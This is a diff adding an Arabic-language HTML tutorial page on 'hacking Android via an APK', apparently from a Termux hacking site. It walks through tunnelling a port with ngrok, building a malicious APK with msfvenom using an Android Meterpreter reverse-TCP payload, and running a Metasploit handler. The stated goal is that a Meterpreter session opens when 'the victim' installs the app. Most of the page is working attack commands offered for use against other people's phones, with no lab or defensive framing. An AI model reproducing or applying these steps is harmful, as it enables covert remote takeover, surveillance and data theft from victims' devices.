@@ -1,0 +1,57 @@
+<html>
+<head>
+<title>
+آخٌ ـتُرآقَ آلَآنِدُروِيّدُ عَ ـنِ طٌريّقَ ÃƤЌ
+</title>
+</head>
+<body dir="rtl"bgcolor="black"LINK="green"
+VLINK="white"
+alink="red"><font  face="times new roman"size="20"color="white">
+<form> 
+<a href="termax.html">للرجوع</a><br>
+<center><i><u><b>اختراق الاندرويد عبر تطبيق apk</b></u></i></center><br>
+اولا يجب ان تكون مثبت اداة Ngrok واداة metasploit<br>
+الان تفتح بورت باداة ngrok <br><br>
+termux-chroot<br><br>
+
+./ngrok tcp 4444<br><br>
+
+وتفتح صفحة جديدة بترمكس وتكتب امر صناعة البايلود <br><br>
+
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.9 LPORT=4444 R > /sdcard/termux.apk<br><br>
+
+مكان الـ 192.168.1.9 حط الايبي الخاص بك<br><br>
+
+مكان 4444 حط البورت المفتوح عندك<br><br>
+
+ثانيا امر فتح اداه MetaSploit<br><br>
+
+msfconsole<br><br>
+
+ثالثا بعد الدخول علي اداه MetaSploit<br><br>
+
+
+$ use exploit/multi/handler <br><br>
+
+$ set payload android/meterpreter/reverse_tcp<br><br>
+
+$ set lhost host<br><br>
+
+مكان الـ host تضع الايبي الخاص بك حسب اختراقك اذا كان خارجي او داخلي<br><br>
+
+
+$ set lport 4444<br><br>
+
+
+مكان الـ port حط البورت المفتوح عندك ويفظل ان يكون 4444<br><br>
+
+
+بعدها <br><br>
+$ run<br><br>
+وعندما يفتح الضحيه التطبيق تفتح لك جلسه Meterpreter<br><br>
+
+اكتب help لعرض اوامر التحكم بالجهاز
+</form> 
+</font> 
+</body> 
+</html> 
